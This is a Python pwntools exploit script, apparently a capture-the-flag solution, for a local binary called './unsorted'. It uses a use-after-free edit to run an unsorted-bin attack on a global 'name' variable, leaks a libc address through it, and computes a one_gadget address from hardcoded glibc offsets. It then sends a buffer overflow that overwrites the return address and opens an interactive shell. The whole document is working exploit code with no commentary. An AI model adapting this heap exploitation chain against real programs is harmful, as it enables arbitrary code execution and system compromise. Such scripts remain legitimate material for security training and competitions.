from pwn import *

p = process("./unsorted")
e = ELF("./unsorted")

def malloc(data):
    p.sendlineafter(b"> ", b"1")
    p.sendafter(b"Data: ", data)

def free(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendafter(b"data: ", data)

def name():
    p.sendlineafter(b"> ", b"4")
    p.recvuntil(b"Name: ")
    ret = p.recvline()[:-1]
    print(ret)
    return ret

def bof(data):
    p.sendlineafter(b"> ", b"5")
    p.send(data)
    p.interactive()

malloc(b"AAAA")
malloc(b"AAAA")
free(0)
edit(0, b"A"*8+p64(e.symbols["name"]-0x10))
malloc(b"AAAA")
libc_base = u64(name()+b"\x00\x00") - 0x3c4b20 - 0x58
og = libc_base + 0xf1247#0x4527a # 0xf03a4 0xf1247
bof(b"A"*0x110 + b"B"*0x8 + p64(og))